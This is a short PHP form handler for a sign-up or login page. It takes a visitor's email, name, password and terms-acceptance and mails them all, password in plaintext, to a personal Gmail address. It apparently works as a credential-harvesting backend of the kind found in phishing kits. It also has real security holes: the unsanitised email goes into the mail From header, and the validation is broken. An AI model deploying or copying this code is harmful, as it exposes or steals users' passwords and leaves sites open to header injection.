<?php
$errorMSG = "";

if (empty($_POST["email"])) {
    $errorMSG = "Email is required ";
} else {
    $email = $_POST["email"];
}

if (empty($_POST["name"])) {
    $errorMSG = "Name is required ";
} else {
    $name = $_POST["name"];
}

if (empty($_POST["password"])) {
    $errorMSG = "Password is required ";
} else {
    $password = $_POST["password"];
}

if (empty($_POST["terms"])) {
    $errorMSG = "Terms is required ";
} else {
    $terms = $_POST["terms"];
}

$EmailTo = "www.machuzz123@gmail.com";
$Subject = "New sign up from loginpage";

// prepare email body text
$Body = "";
$Body .= "Email: ";
$Body .= $email;
$Body .= "\n";
$Body .= "Name: ";
$Body .= $name;
$Body .= "\n";
$Body .= "Password: ";
$Body .= $password;
$Body .= "\n";
$Body .= "Terms: ";
$Body .= $terms;
$Body .= "\n";

// send email
$success = mail($EmailTo, $Subject, $Body, "From:".$email);
// redirect to success page
if ($success && $errorMSG == ""){
   echo "success";
}else{
    if($errorMSG == ""){
        echo "Something went wrong :(";
    } else {
        echo $errorMSG;
    }
}
?>